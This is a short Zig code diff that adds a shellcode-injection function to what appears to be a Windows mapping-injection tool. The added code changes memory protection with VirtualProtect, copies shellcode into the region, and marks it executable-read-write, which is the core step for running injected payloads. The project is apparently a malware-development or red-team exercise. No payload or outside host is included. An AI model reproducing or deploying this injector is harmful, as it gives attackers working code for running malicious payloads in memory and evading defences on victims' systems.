@@ -116,3 +116,29 @@ pub fn mapInject(shell_code: []const u8) !*anyopaque {
 
     return map_address;
 }
+
+pub fn injectShellCode(address: *anyopaque, shell_code: []const u8) !void {
+    var old_protection: PAGE_PROTECTION_FLAGS = undefined;
+
+    if (VirtualProtect(
+        address,
+        shell_code.len,
+        .{ .PAGE_READWRITE = 1 },
+        &old_protection,
+    ) == 0) {
+        std.debug.print("[!] VirtualProtect Failed With Error: {s}\n", .{@tagName(GetLastError())});
+        return error.VirtualProtectFailed;
+    }
+
+    @memcpy(@as([*]u8, @ptrCast(address)), shell_code);
+
+    if (VirtualProtect(
+        address,
+        shell_code.len,
+        .{ .PAGE_EXECUTE_READWRITE = 1 },
+        &old_protection,
+    ) == 0) {
+        std.debug.print("[!] VirtualProtect Failed With Error: {s}\n", .{@tagName(GetLastError())});
+        return error.VirtualProtectFailed;
+    }
+}
